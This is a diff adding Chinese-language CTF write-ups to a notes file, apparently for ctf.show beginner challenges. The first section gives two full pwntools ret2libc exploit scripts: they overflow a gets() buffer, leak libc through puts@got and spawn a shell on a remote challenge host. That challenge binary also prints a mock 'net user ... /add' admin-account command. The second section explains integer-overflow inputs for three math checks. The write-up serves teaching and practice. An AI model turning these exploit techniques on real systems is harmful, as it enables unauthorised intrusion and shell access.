@@ -1042,4 +1042,288 @@ p.interactive()
 
 ![image](assets/image-20260908135648-v1yqozo.png)
 
+‍## 萌新赛-签到题
+
+先进行架构分析
+
+![image](assets/image-20260908151518-osms720.png)
+
+64位小端序的二进制文件，没栈保护，地址不会随机化，没去除符号表，栈不可执行
+
+直接进入逆向分析
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char src[112]; // [rsp+0h] [rbp-70h] BYREF
+
+  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
+  setvbuf(stream: stdin, buf: nullptr, modes: 1, n: 0);
+  puts(s: "[+] net user IIS_Helper cccccc /add");
+  puts(s: "[+] net localgroup administrator IIS_Helper /add");
+  puts(s: "[+] command successful!");
+  gets(a1: src);
+  strncpy(dest: buf2, src, n: 0x64u);
+  printf(format: "hhh,just a joke");
+  return 0;
+}
+```
+
+核心漏洞函数就是gets，它没有长度限制，我们覆盖完src，再覆盖返回地址就能溢出，思考了一会儿，最后四行似乎一点用也没有，buf2是全局变量，但是只拷贝100字节，没有超出buf2的定义长度
+
+前面的那个gets其实已经够用了，我们可以先泄露puts@got，确定远程libc版本，然后打ret2libc
+
+```python
+from pwn import *
+
+context.arch="amd64"
+e=ELF("./pwn")
+puts_plt_addr=e.plt["puts"]
+puts_got_addr=e.got["puts"]
+gets_got_addr=e.got["gets"]
+main_addr=e.sym["main"]
+pop_rdi_addr=0x400793
+payload1=flat(
+    b"a"*120,
+    pop_rdi_addr,
+    puts_got_addr,  # 这里控制想要泄露的got
+    puts_plt_addr,
+    0
+)
+# p=process("./pwn")
+p=remote("pwn.challenge.ctf.show",28117 )
+p.sendlineafter(b"[+] command successful!\n", payload1)
+p.recvuntil(b"hhh,just a joke")
+response=p.recvline().strip()
+leak_addr=u64(response.ljust(8, b"\x00"))
+
+print(hex(leak_addr))
+p.close()
+```
+
+脚本纯手搓出来的，原理我在前面的题目中说过，唯一麻烦的地方是提取输出里的地址
+
+![image](assets/image-20260908160626-yyimldt.png)
+
+我先后用puts和gets的got找到远程运行状态下的内存地址，然后使用libc.rip查询，找到远程libc文件（虽说这里有三个搜索结果，但是我发现里面需要用到的system,sh等地址是一致的
+
+```python
+from pwn import *
+
+context.arch="amd64"
+e=ELF("./pwn")
+puts_plt_addr=e.plt["puts"]
+puts_got_addr=e.got["puts"]
+gets_got_addr=e.got["gets"]
+main_addr=e.sym["main"]
+system_libc_addr=0x4f440
+sh_libc_addr=0x1b3e9a
+puts_libc_addr=0x809c0
+pop_rdi_addr=0x400793
+ret_addr=0x40053e
+payload1=flat(
+    b"a"*120,
+    pop_rdi_addr,
+    puts_got_addr,  # 这里控制想要泄露的got
+    puts_plt_addr,
+    main_addr
+)
+# p=process("./pwn")
+p=remote("pwn.challenge.ctf.show",28117 )
+p.sendlineafter(b"[+] command successful!\n", payload1)
+p.recvuntil(b"hhh,just a joke")
+response=p.recvline().strip()
+leak_addr=u64(response.ljust(8, b"\x00"))
+
+print(hex(leak_addr))
+def payload2(base):
+    return flat(
+        b"a"*120,
+        pop_rdi_addr,
+        base + sh_libc_addr,
+        ret_addr,
+        base + system_libc_addr,
+        0
+    )
+base=leak_addr - puts_libc_addr
+p.sendlineafter(b"[+] command successful!\n", payload2(base))
+p.interactive()
+```
+
+脚本原理很好懂的，然后记得准备下ret地址，最后调用的system务必要让rsp对齐
+
+![image](assets/image-20260908162221-y2xd5fw.png)
+
+## 萌新赛-数学99
+
+先来学点前置知识
+
+```js
+                    32 bits
+              ┌──────────────────────┐
+int           │ s │       31 bits    │
+              └──────────────────────┘
+                ↑
+             符号位
+
+unsigned int   │          32 bits     │
+              └──────────────────────┘
+                没有符号位
+```
+
+上图是int和unsigned int 之间的区别，int相较后者要多一个s符号位
+
+因此int就可以存在负数，范围如下：
+
+```js
+int
+范围：
+-2^31  ~  2^31 - 1
+
+      -2,147,483,648
+              ↓
+              0
+              ↓
+       2,147,483,647
+```
+
+然而unsigned int如下：
+
+```lua
+unsigned int
+范围：
+0 ~ 2^32 - 1
+
+0
+↓
+4,294,967,295
+```
+
+然后举个例子，这是在内存上存储的32bit数据
+
+```js
+10000000 00000000 00000000 00000000
+```
+
+如果我们把它当成unsigned int，就会变成被读成2^31达到2,147,483,648
+
+那么如果我们把它当成int，系统先要检查符号位，检测出这里的符号位是1，系统会判定它是负数，对于负数，int类型会先将整体取反，然后加1，得到的值就是int类型的值
+
+```js
+10000000 00000000 00000000 00000000
+                ↓ 按位取反
+01111111 11111111 11111111 11111111
+                ↓ 末尾加1
+10000000 00000000 00000000 00000000
+                ↓
+          -2147483648
+```
+
 ‍
+
+大致过程就是这样咯，接下来开始解题吧
+
+先进行安全架构分析
+
+![image](assets/image-20260908162548-ajxtgby.png)
+
+保护全开，这里不太可能是简单的溢出题，至少新生赛应该是看不到这样的溢出漏洞的，大概率是那种挑战题，直接逆向分析
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  alarm(seconds: 0x3Cu);
+  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
+  puts(s: "CTFshow pwn2");
+  puts(s: "Can you help me to solve some eazy math problem?");
+  if ( (unsigned int)sub_9C0() != 0 && (unsigned int)sub_AEE() != 0 && (unsigned int)sub_BA3() != 0 )
+    puts(s: "That's impossible!");
+  else
+    puts(s: "Baka!");
+  return 0;
+}
+```
+
+在main里面，通过puts提示，本题应该是和几个数学挑战有关的，然后if判断中需要我们连续完成三个挑战，先分析第一个
+
+![image](assets/image-20260908164714-vklhm0q.png)
+
+题目内容为两个大小均在[0,9)的数，作差的结果为9，这个真的可能吗？显然不行，这里就涉及到了整数溢出的知识点
+
+先明确一点，v1和v2都是int有符号整数，然后atoi函数的作用是将字符串转成int整型数字
+
+至于那两个if判断是检测输入内容中是否出现`-`号，这看似避免了我们让b变成-1后实现a-b=9
+
+实则不然，还记得之前讲过的unsigned int和int之间的差异吗？前者是无符号整数，后者是有符号整数
+
+int是32位，想让它表示负数，必须使用补码，这里的-1就是
+
+```c
+11111111 11111111 11111111 11111111
+```
+
+如果换成超大整数，就变成了4294967295
+
+如果让atom处理上面的大整数，它会先处理成int有符号整数类型，这个时候需要看最左侧的符号位，因为是1，所以会按照补码分析，这样的话，那个超大整数就变成了-1
+
+再回顾这里的if判断，由于atom是在if后面进行的，因此我们上面的整数溢出为-1的操作是可行的，因此第一关卡要输入的两个值分别是8和4294967295
+
+![image](assets/image-20260908165941-ckj7bj5.png)
+
+挑战成功，进入到第二个关卡
+
+![image](assets/image-20260908170007-r61nj6x.png)
+
+这次的挑战是要让两个大于9的数字相乘变成9，看似不太可能成功的任务只能用整数溢出来解释了
+
+我在这里写下整数溢出的数学过程，因为它大多数情况存在于有符号整数的运算操作，因此我们需要用那个类型的范围作为模域，比如int类型，我们只能在模2^32下进行操作，因此可以转换那个乘法运算
+
+```c
+v1 * v2 ≡ 9 (mod 2^32)
+```
+
+我们可以直接计算`2^32+9*n`，n随意，只要这个大数可以被因式分解成两个整数就行
+
+![image](assets/image-20260908171019-sylymw8.png)
+
+这里分成`5*9629*89209`​，因为我们只需要输入两个整数，这里把前两个因式合并掉，得到`48145*89209`
+
+![image](assets/image-20260908211834-jb0u1ph.png)
+
+来到了第三关卡
+
+```c
+__int64 sub_BA3()
+{
+  int v1; // [rsp+Ch] [rbp-14h] BYREF
+  _DWORD v2[2]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  puts(s: "3.a/b=ERROR,b!=0");
+  printf(format: "a:");
+  __isoc99_scanf(a1: "%d", &v1);
+  printf(format: "b:");
+  __isoc99_scanf(a1: "%d", v2);
+  if ( v2[0] != 0 )
+  {
+    signal(sig: 8, handler: handler);
+    v2[1] = v1 / v2[0];
+    signal(sig: 8, handler: nullptr);
+  }
+  return 0;
+}
+```
+
+还是输入两个整数，这次要求b不能为0，让除法运算错误
+
+用整数溢出解释，我们需要考虑int类型的最大值和最小值
+
+```sql
+最大值：INT_MAX = 2147483647  (2^31 - 1)
+最小值：INT_MIN = -2147483648 (-2^31)
+```
+
+单纯论绝对值，这里的最小值的绝对值是不是大于最大值的绝对值呢？然后第三关是不是没有检查负号呢？那么好了，我让b变成-1,a变成最小值，进行除法运算是不是就能来到最大值+1呢？这个时候就能触发溢出错误，本题操作不难，我就不写脚本了
+
+![image](assets/image-20260908212413-spexf3w.png)
